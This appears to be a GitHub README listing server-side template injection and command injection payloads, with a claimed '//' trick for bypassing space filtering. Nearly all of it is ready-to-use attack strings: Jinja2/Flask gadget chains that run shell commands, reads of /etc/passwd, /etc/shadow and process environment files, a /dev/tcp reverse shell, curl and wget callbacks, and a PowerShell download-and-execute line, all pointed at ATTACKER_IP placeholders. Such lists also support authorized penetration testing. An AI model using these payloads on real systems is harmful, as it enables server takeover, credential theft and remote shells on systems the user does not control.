# SSTI-Command-Inection
A repo of payloads including // space sanitation bypass 


### **Expanded List of Server-Side Template Injection (SSTI) and Command Injection Payloads**

**1. Server-Side Template Injection (SSTI) Payloads**

These payloads are designed to test for and exploit vulnerabilities in backend template engines, allowing code execution within the template context. The examples heavily feature Python Jinja2/Flask due to its commonality and the previous context, but the principles apply broadly.

* **Basic Arithmetic & Evaluation (SSTI Confirmation):**
    * `{{7*7}}`
    * `{{1+1}}`
    * `{{'a'+'b'}}`
    * `{{2**10}}`
    * `<%- 7*7 %>` (Ruby ERB/Rails)
    * `${7*7}` (Various EL/Velocity)
    * `#set($x=7*7)$x` (Apache Velocity)
    * `{{ 7 / 0 }}` (Error-based detection)

* **Variable/Object Access & Introspection (Python Jinja2/Flask):**
    * `{{ config }}`
    * `{{ request }}`
    * `{{ self }}`
    * `{{ ''.__class__ }}`
    * `{{ ''.__class__.__mro__ }}`
    * `{{ ''.__class__.__mro__[1] }}`
    * `{{ ''.__class__.__mro__[1].__subclasses__() }}`
    * `{{ [].__class__.__base__ }}`
    * `{{ [].__class__.__base__.__subclasses__() }}`
    * `{% for x in config.items() %}{{ x }}{% endfor %}`
    * `{{ get_flashed_messages.__globals__['current_app'].config }}`

* **Remote Code Execution (RCE) via SSTI (Python Jinja2/Flask Gadgets):**
    * `{{ ''.__class__.__mro__[1].__subclasses__()[idx].__init__.__globals__['os'].popen('id').read() }}` (Replace `idx` with index of `warnings.catch_warnings` or similar)
    * `{{ [].__class__.__base__.__subclasses__()[idx].__init__.__globals__['os'].popen('id').read() }}` (Alternative base, replace `idx`)
    * `{{ cycler.__init__.__globals__.os.popen('id').read() }}` (If `cycler` is accessible)
    * `{{ lipsum.__globals__['os'].popen('id').read() }}` (If `lipsum` is accessible)
    * `{{ g.__class__.__base__.__subclasses__()[idx].__init__.__globals__['os'].popen('id').read() }}` (If `g` is accessible, replace `idx`)
    * `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
    * `{{ url_for.__globals__['os'].popen('id').read() }}`
    * `{{ request.application.__globals__['os'].popen('ls -la').read() }}`
    * `{{ request.args.__class__.__mro__[1].__subclasses__()[idx].__init__.__globals__['os'].popen('id').read() }}` (If args is accessible, replace `idx`)
    * `{{ request.environ['werkzeug.server.shutdown'].__globals__['os'].popen('id').read() }}`
    * `{{ self._TemplateReference__context.joiner.__builtins__['__import__']('os').popen('id').read() }}`

**2. Command Injection Payloads**

These payloads aim to execute arbitrary system commands, typically by escaping user input within a shell command executed by the server.

* **Basic Command Execution (Linux/Unix):**
    * `; id`
    * `| whoami`
    * `&& ls -la`
    * `|| cat /etc/passwd`
    * `$(uname -a)`
    * `` `hostname` ``
    * `%0a cat /etc/shadow` (Newline character)

* **Space Bypass with `//` (Double Forward Slash):**
    * `{exec//ls-la}` (Originally used in template context, adaptable for direct shell injection if syntax allows)
    * `{system{ls//-F//slash}}` (Originally used in template context, adaptable)
    * `cat//etc//hosts`
    * `cat//proc//cpuinfo`
    * `cat//proc//self//environ`
    * `ip//a`
    * `netstat//-natp`
    * `ps//aux`
    * `df//-h`
    * `free//-m`
    * `w`
    * `history`
    * `env`
    * `{system{netstat//-natp}}`(network enumeration)
    * `/bin/bash//-i//>&//dev/tcp/ATTACKER_IP/ATTACKER_PORT//0>&1` (Reverse shell attempt, replace IP/PORT)
    * `{system{ping-c1//XXX-XXX-XXX-XXX}}@gmail.com` (OOB with space sanitation bypass in email entry fields.)

* **Out-of-Band (OOB) Interaction:**
    * `& ping -c 1 ATTACKER_IP` (Ping callback, replace IP)
    * `; nslookup ATTACKER_DOMAIN` (DNS callback, replace DOMAIN)
    * `| curl http://ATTACKER_IP/callback` (HTTP callback, replace IP)
    * `&& wget http://ATTACKER_IP/payload.sh -O /tmp/p.sh` (Download file, replace IP)

* **Other Variations and Obfuscation:**
    * `%3Bcat%2Fetc%2Fpasswd` (URL-encoded semicolon and slash)
    * `%7Cid` (URL-encoded pipe)
    * `$(echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d)` (Base64 encoded command)
    * `%0aid%0a` (Multiple newlines)
    * `cat` ` /etc/passwd` (Space bypass via backticks if applicable)
    * `a%0a%23b%0acat%2fetc%2fpasswd` (Newline, comment, newline, payload)

* **Windows Specific (If target is Windows):**
    * `& dir c:`
    * `| ipconfig`
    * `&& type C:\Windows\System32\drivers\etc\hosts`
    * `%0a whoami`
    * `& powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"` (PowerShell download/execute)

---
